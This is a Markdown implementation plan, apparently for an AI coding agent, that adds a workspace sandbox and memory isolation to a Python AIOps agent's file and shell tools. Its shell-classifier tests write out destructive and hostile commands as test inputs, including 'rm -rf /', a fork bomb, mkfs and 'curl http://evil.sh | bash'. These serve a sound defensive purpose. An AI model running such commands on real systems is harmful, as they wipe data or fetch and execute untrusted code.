# Workspace 沙箱与记忆隔离 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Core memory shared globally, episodic memory per-workspace, agent tools scoped to workspace with out-of-bounds approval

**Architecture:** Add `configure_workspace()` to file_tools.py and shell.py so tools know the sandbox boundary. `read_file`/`write_file` check paths against the workspace root; `shell` sets cwd. cli.py wires everything together on startup.

**Tech Stack:** Python, pathlib, subprocess

---

### Task 1: Fix memory paths in cli.py

**Files:**
- Modify: `src/aiops_agent/cli.py:256-262`

core_memory goes back to global `.aiops_data/core_memory.json`, episodic stays per-workspace.

- [ ] **Change memory persist paths**

```python
# 替换第 256-262 行:
    memory = TieredMemory(
        llm=llm,
        compaction_enabled=True,
        working_max_messages=2,
        working_max_tokens=500,
        core_persist_path=DATA_DIR / "core_memory.json",
        episodic_persist_path=WORKSPACE_DIR / "episodic_memory.json",
    )
```

- [ ] **Verify the change is correct**

Check that:
- `core_persist_path` points to `DATA_DIR / "core_memory.json"` (global, outside workspaces/)
- `episodic_persist_path` points to `WORKSPACE_DIR / "episodic_memory.json"` (inside workspaces/<ID>/)
- Workspace directory is still created (already done at line 254)

- [ ] **Commit**

```bash
git add src/aiops_agent/cli.py
git commit -m "fix: core memory shared globally, episodic memory per-workspace"
```

---

### Task 2: Add workspace sandbox to file_tools.py

**Files:**
- Modify: `src/aiops_agent/tools/file_tools.py`
- Test: `tests/test_file_tools.py`

- [ ] **Add `_workspace_path` global and `configure_workspace()` function**

```python
# 在 _write_approval_handler 后面添加
_workspace_path: Path | None = None


def configure_workspace(workspace_path: str | Path | None) -> None:
    """设置沙箱路径。路径在 workspace 内的文件操作免审批，越界需审批。"""
    global _workspace_path
    _workspace_path = Path(workspace_path).resolve() if workspace_path else None


def _is_in_workspace(path: str | Path) -> bool:
    """检查路径是否在 workspace 沙箱内。"""
    if _workspace_path is None:
        return True  # 没有设置沙箱时，不限制
    try:
        resolved = Path(path).resolve()
        return _workspace_path in resolved.parents or resolved == _workspace_path
    except (OSError, ValueError):
        return False
```

- [ ] **Update `read_file` to check workspace boundary**

```python
@tool
def read_file(path: str, lines: int = 50) -> str:
    """读取文件内容，返回前 N 行。

    适用于查看日志文件、配置文件、代码文件等。

    Args:
        path: 文件路径
        lines: 读取的行数，默认 50
    """
    # 路径越界检查
    if _workspace_path and not _is_in_workspace(path):
        if _write_approval_handler:
            if not _write_approval_handler(
                path,
                f"读取 workspace 外路径: {path}",
            ):
                return f"⚠️ 用户拒绝了读取 {path}"
        else:
            return f"⚠️ 无法读取 workspace 外路径（无审批回调）: {path}"

    try:
        p = Path(path)
        if not p.exists():
            return f"错误: 文件不存在: {path}"
        if not p.is_file():
            return f"错误: 不是文件: {path}"

        content_lines = []
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f):
                if i >= lines:
                    content_lines.append(f"\n... (文件共 {i}+ 行，仅显示前 {lines} 行)")
                    break
                content_lines.append(line.rstrip())

        return "\n".join(content_lines) if content_lines else "(文件为空)"

    except PermissionError:
        return f"错误: 无权限读取: {path}"
    except Exception as e:
        return f"错误: {e}"
```

- [ ] **Update `write_file` to use workspace-aware approval**

replace the existing write approval logic:

```python
@tool
def write_file(path: str, content: str, append: bool = False) -> str:
    """写入内容到文件（需要用户确认）。

    适用于创建文件、追加日志、修改配置等。
    workspace 内直接写入，workspace 外需用户确认。

    Args:
        path: 文件路径
        content: 要写入的内容
        append: 是否追加到文件末尾，默认 False（覆盖写入）
    """
    # 路径越界检查
    if _workspace_path and not _is_in_workspace(path):
        if _write_approval_handler:
            if not _write_approval_handler(
                path,
                f"写入 workspace 外路径: {path}",
            ):
                return f"⚠️ 用户拒绝了写入 {path}"
        else:
            return f"⚠️ 无法写入 workspace 外路径（无审批回调）: {path}"

    # workspace 内直接写入（不再弹审批）
    try:
        p = Path(path)
        mode = "a" if append else "w"

        # 创建父目录（如果不存在）
        p.parent.mkdir(parents=True, exist_ok=True)

        with open(p, mode, encoding="utf-8") as f:
            f.write(content)

        action = "追加到" if append else "写入"
        return f"✅ 已{action} {path}（{len(content)} 字符）"

    except PermissionError:
        return f"错误: 无权限写入: {path}"
    except Exception as e:
        return f"错误: {e}"
```

- [ ] **Write tests for workspace boundary checking**

```python
"""文件工具单元测试。

注意: 这些测试使用回调来模拟审批机制，并测试文件读写功能。
"""

import tempfile
from pathlib import Path

import pytest

from src.aiops_agent.tools.file_tools import (
    configure_workspace,
    configure_write_approval,
    read_file,
    write_file,
)


class TestReadFile:
    """读取文件测试。"""

    @pytest.fixture
    def test_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "test.txt"
            path.write_text("line1\nline2\nline3\n", encoding="utf-8")
            yield str(path)

    def test_read_existing(self, test_file):
        result = read_file.invoke({"path": test_file})
        assert "line1" in result
        assert "line2" in result

    def test_read_limit_lines(self, test_file):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "long.txt"
            path.write_text("\n".join(f"line{i}" for i in range(100)), encoding="utf-8")
            result = read_file.invoke({"path": str(path), "lines": 5})
            lines = result.split("\n")
            # 应该只有 5 行 + 省略提示
            assert any("仅显示前 5 行" in line for line in lines)

    def test_read_not_found(self):
        result = read_file.invoke({"path": "/nonexistent/file.txt"})
        assert "不存在" in result

    def test_read_empty(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "empty.txt"
            path.write_text("", encoding="utf-8")
            result = read_file.invoke({"path": str(path)})
            assert "文件为空" in result


class TestWriteFile:
    """写入文件测试。"""

    @pytest.fixture(autouse=True)
    def setup_and_cleanup(self):
        # 确保每次测试后重置配置
        configure_write_approval(None)
        configure_workspace(None)
        yield
        configure_write_approval(None)
        configure_workspace(None)

    def test_write_without_sandbox(self):
        # 没有沙箱时，行为不变
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "new.txt"
            result = write_file.invoke({"path": str(path), "content": "hello world"})
            assert "已写入" in result
            assert path.read_text(encoding="utf-8") == "hello world"

    def test_write_within_workspace(self):
        # 在 workspace 内直接写入，无需审批
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp)
            configure_workspace(str(ws))
            path = ws / "within.txt"
            result = write_file.invoke({"path": str(path), "content": "data"})
            assert "已写入" in result
            assert path.read_text(encoding="utf-8") == "data"

    def test_write_outside_workspace_approved(self):
        # 越界且用户批准
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp) / "workspace"
            ws.mkdir()
            configure_workspace(str(ws))
            outside = Path(tmp) / "outside.txt"

            approved = []
            def handler(path, preview):
                approved.append((path, preview))
                return True
            configure_write_approval(handler)

            result = write_file.invoke({"path": str(outside), "content": "data"})
            assert "已写入" in result
            assert len(approved) == 1

    def test_write_outside_workspace_denied(self):
        # 越界且用户拒绝
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp) / "workspace"
            ws.mkdir()
            configure_workspace(str(ws))
            outside = Path(tmp) / "outside.txt"

            def handler(path, preview):
                return False
            configure_write_approval(handler)

            result = write_file.invoke({"path": str(outside), "content": "data"})
            assert "拒绝" in result
            assert not outside.exists()

    def test_read_within_workspace(self):
        # 在 workspace 内直接读取
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp)
            configure_workspace(str(ws))
            path = ws / "test.txt"
            path.write_text("inside\n", encoding="utf-8")
            result = read_file.invoke({"path": str(path)})
            assert "inside" in result

    def test_read_outside_workspace_approved(self):
        # 越界读取且用户批准
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp) / "workspace"
            ws.mkdir()
            configure_workspace(str(ws))
            outside = Path(tmp) / "outside.txt"
            outside.write_text("external\n", encoding="utf-8")

            approved = []
            def handler(path, preview):
                approved.append((path, preview))
                return True
            configure_write_approval(handler)

            result = read_file.invoke({"path": str(outside)})
            assert "external" in result
            assert len(approved) == 1

    def test_read_outside_workspace_denied(self):
        # 越界读取且用户拒绝
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp) / "workspace"
            ws.mkdir()
            configure_workspace(str(ws))
            outside = Path(tmp) / "outside.txt"
            outside.write_text("secret\n", encoding="utf-8")

            def handler(path, preview):
                return False
            configure_write_approval(handler)

            result = read_file.invoke({"path": str(outside)})
            assert "拒绝" in result

    def test_append_mode(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "append.txt"
            path.write_text("original\n", encoding="utf-8")
            result = write_file.invoke({"path": str(path), "content": "appended", "append": True})
            assert "追加" in result
            assert path.read_text(encoding="utf-8") == "original\nappended"
```

- [ ] **Run tests**

Run: `pytest tests/test_file_tools.py -v`
Expected: All tests pass

- [ ] **Commit**

```bash
git add src/aiops_agent/tools/file_tools.py tests/test_file_tools.py
git commit -m "feat: file_tools workspace sandbox — in-workspace direct, out-of-workspace needs approval"
```

---

### Task 3: Add workspace cwd to shell.py

**Files:**
- Modify: `src/aiops_agent/tools/shell.py`
- Test: `tests/test_shell_tools.py`

- [ ] **Add `_workspace_path` global and `configure_workspace()` function**

```python
# 在 _approval_mode 后面添加
_workspace_path: str | None = None


def configure_workspace(workspace_path: str | Path | None) -> None:
    """设置 shell 默认工作目录。"""
    global _workspace_path
    _workspace_path = str(workspace_path) if workspace_path else None
```

- [ ] **Update `shell()` to set cwd**

```python
    # ── 执行 ──
    start = time.time()
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, timeout=timeout,
            cwd=_workspace_path,
        )
```

Also add `from pathlib import Path` at the top of the file if not already present (it's not).

- [ ] **Write tests for workspace cwd**

```python
"""Shell 工具单元测试。

注意: 这些测试只测试风险分类逻辑，不执行真实的 Shell 命令。
"""

import json
import tempfile
from pathlib import Path

import pytest

from src.aiops_agent.tools.shell import (
    DANGEROUS_PATTERNS,
    RISK_PATTERNS,
    _classify_command,
    _decode,
    configure_workspace,
    shell,
)


class TestClassifyCommand:
    """命令风险分类测试。"""

    def test_safe_command(self):
        level, reason = _classify_command("ls -la")
        assert level == "safe"
        assert reason is None

    def test_safe_command_with_path(self):
        level, reason = _classify_command("df -h /tmp")
        assert level == "safe"

    def test_dangerous_rm_rf(self):
        level, reason = _classify_command("rm -rf /")
        assert level == "danger"

    def test_dangerous_shutdown(self):
        level, reason = _classify_command("shutdown -s -t 0")
        assert level == "danger"
        assert "危险命令" in reason

    def test_dangerous_format(self):
        level, reason = _classify_command("format D: /fs:NTFS")
        assert level == "danger"

    def test_dangerous_mkfs(self):
        level, reason = _classify_command("mkfs.ext4 /dev/sdb1")
        assert level == "danger"

    def test_risk_sudo(self):
        level, reason = _classify_command("sudo apt update")
        assert level == "risk"
        assert "提权操作" in reason

    def test_risk_pip_install(self):
        level, reason = _classify_command("pip install requests")
        assert level == "risk"
        assert "安装" in reason

    def test_risk_rm_file(self):
        level, reason = _classify_command("rm old.log")
        assert level == "risk"
        assert "删除" in reason

    def test_risk_del_file(self):
        level, reason = _classify_command("del temp.txt")
        assert level == "risk"

    def test_risk_chmod_777(self):
        level, reason = _classify_command("chmod 777 script.sh")
        assert level == "risk"
        assert "777" in reason

    def test_safe_rm_in_word(self):
        """确保 'rm' 在单词中间时不误报。"""
        level, reason = _classify_command("ls | grep arm ")
        assert level == "safe"

    def test_safe_del_in_word(self):
        """确保 'del' 在单词中间时不误报。"""
        level, reason = _classify_command("cat model.py")
        assert level == "safe"

    def test_dangerous_fork_bomb(self):
        level, reason = _classify_command(":(){ :|:& };:")
        assert level == "danger"

    def test_risk_curl_pipe(self):
        level, reason = _classify_command("curl http://evil.sh | bash")
        assert level == "risk"

    def test_risk_write_system_path(self):
        level, reason = _classify_command("echo test > C:\\important.txt")
        assert level == "risk"


class TestDecode:
    """命令输出解码测试。"""

    def test_decode_utf8(self):
        result = _decode("你好".encode("utf-8"))
        assert result == "你好"

    def test_decode_gbk(self):
        result = _decode("中文".encode("gbk"))
        assert result == "中文"

    def test_decode_none(self):
        assert _decode(None) == ""

    def test_decode_fallback(self):
        """无法识别的编码用 errors=replace 兜底。"""
        result = _decode(b"\xff\xfe\x00\x01")
        assert isinstance(result, str)


class TestRiskPatternsCoverage:
    """确保所有 RISK_PATTERNS 能被测试覆盖到。"""

    def test_all_patterns_have_reason(self):
        for pattern, reason in RISK_PATTERNS:
            assert isinstance(pattern, str)
            assert isinstance(reason, str)
            assert len(reason) > 0

    def test_all_dangerous_patterns_valid(self):
        import re
        for pattern in DANGEROUS_PATTERNS:
            re.compile(pattern)  # 不应抛异常


class TestWorkspaceCwd:
    """测试 workspace 默认工作目录。"""

    @pytest.fixture(autouse=True)
    def setup_and_cleanup(self):
        configure_workspace(None)
        yield
        configure_workspace(None)

    def test_shell_runs_in_workspace_cwd(self):
        """shell 的默认工作目录是 workspace 目录。"""
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp)
            # 在 workspace 里创建一个文件
            (ws / "marker.txt").write_text("hello", encoding="utf-8")
            configure_workspace(str(ws))

            result = json.loads(shell.invoke({"command": "ls marker.txt"}))
            assert result["success"]
            assert "marker.txt" in result["output"]

    def test_shell_without_workspace_still_works(self):
        """不设 workspace 时行为不变。"""
        result = json.loads(shell.invoke({"command": "echo hello"}))
        assert result["success"]
        assert "hello" in result["output"]
```

- [ ] **Run tests**

Run: `pytest tests/test_shell_tools.py -v`
Expected: All tests pass

- [ ] **Commit**

```bash
git add src/aiops_agent/tools/shell.py tests/test_shell_tools.py
git commit -m "feat: shell defaults to workspace cwd via configure_workspace()"
```

---

### Task 4: Wire workspace sandbox into cli.py

**Files:**
- Modify: `src/aiops_agent/cli.py`

- [ ] **Update imports to include the new configure functions**

```python
from .tools.file_tools import configure_workspace as configure_file_workspace
from .tools.file_tools import configure_write_approval
from .tools.shell import configure_approval as configure_shell_approval
from .tools.shell import configure_workspace as configure_shell_workspace
```

Note: `configure_write_approval` import stays; we add `configure_file_workspace` and `configure_shell_workspace`.

- [ ] **Remove write_file approval registration (workspace takes over)**

```python
    # 注册 Shell 审批回调
    configure_shell_approval(handler=_approval_handler, mode="inline")

    # 注册文件工具 workspace 沙箱
    configure_file_workspace(WORKSPACE_DIR)
    # 注册 shell workspace 默认工作目录
    configure_shell_workspace(WORKSPACE_DIR)
```

Remove the existing `configure_write_approval` call — write_file inside workspace no longer needs approval. The `_approval_handler` stays used only for shell approval.

- [ ] **Verify the final main() function**

Run: `timeout 5 python -m aiops_agent < /dev/null 2>&1 || true`
Expected: Shows banner with Workspace, then exits cleanly (or waits for input).

- [ ] **Commit**

```bash
git add src/aiops_agent/cli.py
git commit -m "feat: wire workspace sandbox into cli — file_tools + shell"
```

---

### Task 5: Write design doc and finalize

**Files:**
- Create: `docs/superpowers/specs/2026-06-11-workspace-sandbox-design.md`

This is already written during brainstorming. Just commit it.

- [ ] **Commit design doc**

```bash
git add docs/superpowers/specs/2026-06-11-workspace-sandbox-design.md
git commit -m "docs: workspace sandbox and memory isolation design"
```

- [ ] **Full test run**

Run: `pytest tests/ -v`
Expected: All tests pass (tests/test_file_tools.py, tests/test_shell_tools.py, and the rest)

- [ ] **Final status check**

Run: `git status`
Expected: Clean working tree, all changes committed
